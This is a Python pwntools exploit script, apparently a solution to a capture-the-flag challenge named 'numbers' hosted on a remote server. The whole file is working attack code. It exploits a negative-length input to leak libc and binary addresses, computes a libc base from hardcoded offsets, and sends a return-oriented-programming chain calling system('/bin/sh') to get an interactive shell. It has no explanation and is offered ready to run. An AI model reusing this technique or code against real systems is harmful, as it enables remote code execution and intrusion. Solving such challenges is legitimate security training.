from pwn import *
import sys
from time import sleep

HOST = 'numbers.fword.wtf'
PORT = 1237
#LIBC = ELF("./libc.so.6",checksec = False)
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./numbers')
    #context.log_level = "debug"

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

offsets = [0x37480,0xd3480,0x14a480,0x126480,0x11a480,0xe1480,0x118480,0x91480]

if __name__=="__main__":
    sleep(1)
    sla('mind ??\n','-8')
    sa('sure ??\n','a'*8)
    reu('a'*8)
    libc = u64(re(6) + '\x00'*2)
    log.info("libc -> " + hex(libc))
    sa('again ?\n','y')
    sa('mind ??\n','-8')
    sa('sure ??\n','a'*24)
    reu('a'*24)
    code = u64(re(6) + '\x00'*2) - 0x8e9
    log.info('code = ' + hex(code))
    pop_rdi = code + 0xad3
    pop_rsi = code + 0xad1
    sa('again ?\n','y')
    sla('mind ??\n','-8')
    libc_base = libc - offsets[0]
    log.info("libc base -> " + hex(libc_base))
    binsh = libc_base + 0x1b6613
    system = libc_base + 0x0554e0
    gdb.attach(io)
    sa('sure ??\n','a'*0x48 + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0)*2 + p64(system))
    io.interactive()